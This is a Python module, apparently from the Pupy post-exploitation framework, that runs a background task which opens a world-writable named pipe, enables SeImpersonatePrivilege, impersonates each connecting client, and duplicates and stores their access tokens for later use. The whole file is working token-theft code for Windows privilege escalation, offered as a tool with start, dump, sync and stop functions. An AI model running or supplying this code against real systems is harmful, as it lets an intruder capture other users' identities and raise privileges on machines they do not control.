# -*- encoding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

from io import open
from traceback import format_exc

from pupwinutils.security import (
    kernel32, advapi32,
)

from pupwinutils.security import (
    LPCSTR, PSECURITY_ATTRIBUTES, SECURITY_ATTRIBUTES,
    HANDLE, DWORD, BOOL, LPVOID, sizeof, addressof, byref,
    INVALID_HANDLE_VALUE, WinError, get_last_error,
    create_string_buffer, ReadFile, CloseHandle,
    EnablePrivilege, DuplicateTokenEx,
    get_thread_token, rev2self, GetTokenSid, GetUserName,
    TOKEN_ALL_ACCESS, IMPERSONATION_TOKENS
)

from pupy import Task, manager

CreateNamedPipe = kernel32.CreateNamedPipeA
CreateNamedPipe.restype = HANDLE
CreateNamedPipe.argtypes = (
    LPCSTR,
    DWORD, DWORD, DWORD, DWORD,
    DWORD, DWORD, PSECURITY_ATTRIBUTES
)

ConnectNamedPipe = kernel32.ConnectNamedPipe
ConnectNamedPipe.restype = BOOL
ConnectNamedPipe.argtypes = (
    HANDLE, LPVOID
)

WaitNamedPipeA = kernel32.WaitNamedPipeA
WaitNamedPipeA.restype = BOOL
WaitNamedPipeA.argtypes = (
  LPCSTR, DWORD
)

InitializeSecurityDescriptor = advapi32.InitializeSecurityDescriptor
InitializeSecurityDescriptor.restype = BOOL
InitializeSecurityDescriptor.argtypes = (
    LPVOID, DWORD
)

SetSecurityDescriptorDacl = advapi32.SetSecurityDescriptorDacl
SetSecurityDescriptorDacl.restype = BOOL
SetSecurityDescriptorDacl.argtypes = (
    LPVOID, BOOL, LPVOID, BOOL
)

ImpersonateNamedPipeClient = advapi32.ImpersonateNamedPipeClient
ImpersonateNamedPipeClient.restype = BOOL
ImpersonateNamedPipeClient.argtypes = (
    HANDLE,
)

SECURITY_DESCRIPTOR_MIN_LENGTH = 40
SECURITY_DESCRIPTOR_REVISION = 1

NMPWAIT_USE_DEFAULT_WAIT = 0x00000000
NMPWAIT_WAIT_FOREVER = 0xffffffff

PIPE_ACCESS_DUPLEX = 0x00000003
PIPE_ACCESS_INBOUND = 0x00000001
PIPE_ACCESS_OUTBOUND = 0x00000002

FILE_FLAG_FIRST_PIPE_INSTANCE = 0x00080000
FILE_FLAG_WRITE_THROUGH = 0x80000000
FILE_FLAG_OVERLAPPED = 0x40000000

WRITE_DAC = 0x00040000
WRITE_OWNER = 0x00080000
ACCESS_SYSTEM_SECURITY = 0x01000000

PIPE_TYPE_BYTE = 0x00000000
PIPE_TYPE_MESSAGE = 0x00000004

PIPE_READMODE_BYTE = 0x00000000
PIPE_READMODE_MESSAGE = 0x00000002

PIPE_WAIT = 0x00000000
PIPE_NOWAIT = 0x00000001

PIPE_ACCEPT_REMOTE_CLIENTS = 0x00000000
PIPE_REJECT_REMOTE_CLIENTS = 0x00000008

PIPE_UNLIMITED_INSTANCES = 255

ERROR_BROKEN_PIPE = 109


class PipeCatcher(Task):
    __slots__ = (
        'tokens', 'hPipe', 'pipename', 'error'
    )

    def __init__(self, *args, **kwargs):
        name = kwargs.pop('name', 'catcher')

        super(PipeCatcher, self).__init__(*args, **kwargs)
        self.pipename = '\\\\.\\pipe\\' + name
        self.tokens = {}
        self.hPipe = INVALID_HANDLE_VALUE
        self.error = None

    def world_writable_pipe(self):
        sd = create_string_buffer(SECURITY_DESCRIPTOR_MIN_LENGTH)
        InitializeSecurityDescriptor(sd, SECURITY_DESCRIPTOR_REVISION)
        SetSecurityDescriptorDacl(sd, True, None, False)

        sa = SECURITY_ATTRIBUTES()
        sa.nLength = sizeof(sa)
        sa.lpSecurityDescriptor = addressof(sd)
        sa.bInheritHandle = False

        self.hPipe = CreateNamedPipe(
            self.pipename,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            1024,
            1024,
            1000,
            sa
        )

        if self.hPipe == INVALID_HANDLE_VALUE:
            raise WinError(get_last_error())

    def stop(self):
        super(PipeCatcher, self).stop()
        if self.hPipe != INVALID_HANDLE_VALUE:
            try:
                with open(self.pipename, 'w') as pipe:
                    pipe.write('1')
            except (OSError, IOError):
                pass

            CloseHandle(self.hPipe)
            self.hPipe = INVALID_HANDLE_VALUE

    def task(self):
        EnablePrivilege('SeImpersonatePrivilege')

        while self.active:
            try:
                self.world_writable_pipe()
                username, sid = self.impersonate_token_from_pipe()
                if sid:
                    self.append((username, sid))

            except Exception:
                self.error = format_exc()
                break
            finally:
                if self.hPipe != INVALID_HANDLE_VALUE:
                    CloseHandle(self.hPipe)

    def impersonate_token_from_pipe(self):
        try:
            if not ConnectNamedPipe(self.hPipe, None):
                raise WinError(get_last_error())

            amount = 1024
            buffer = create_string_buffer(amount)
            read = DWORD()

            if not ReadFile(self.hPipe, buffer, amount, byref(read), None):
                error = get_last_error()
                if error == ERROR_BROKEN_PIPE:
                    return None, None
                else:
                    raise WinError(get_last_error())

            if not ImpersonateNamedPipeClient(self.hPipe):
                raise WinError(get_last_error())

            try:
                username = GetUserName()
                hToken = get_thread_token()

                try:
                    sid = GetTokenSid(hToken, exc=False)

                    hTokendupe = HANDLE(INVALID_HANDLE_VALUE)
                    SecurityImpersonation = 2
                    TokenImpersonation = 2

                    if not DuplicateTokenEx(
                        hToken, TOKEN_ALL_ACCESS, None, SecurityImpersonation,
                            TokenImpersonation, byref(hTokendupe)):
                        raise WinError(get_last_error())

                    self.tokens[sid] = hTokendupe

                    if sid not in IMPERSONATION_TOKENS:
                        IMPERSONATION_TOKENS[sid] = username, hTokendupe

                    return username, sid

                finally:
                    CloseHandle(hToken)

            finally:
                rev2self()

        finally:
            CloseHandle(self.hPipe)
            self.hPipe = INVALID_HANDLE_VALUE


def catcher_start(event_id=None):
    if manager.active(PipeCatcher):
        return False

    manager.create(PipeCatcher, event_id=event_id)
    return True


def catcher_dump():
    catcher = manager.get(PipeCatcher)

    if catcher:
        return catcher.results


def catcher_sync():
    catcher = manager.get(PipeCatcher)
    if catcher:
        for sid, token in catcher.tokens.items():
            if sid not in IMPERSONATION_TOKENS:
                IMPERSONATION_TOKENS[sid] = token


def catcher_stop():
    catcher_sync()
    catcher = manager.get(PipeCatcher)
    if catcher:
        manager.stop(PipeCatcher)
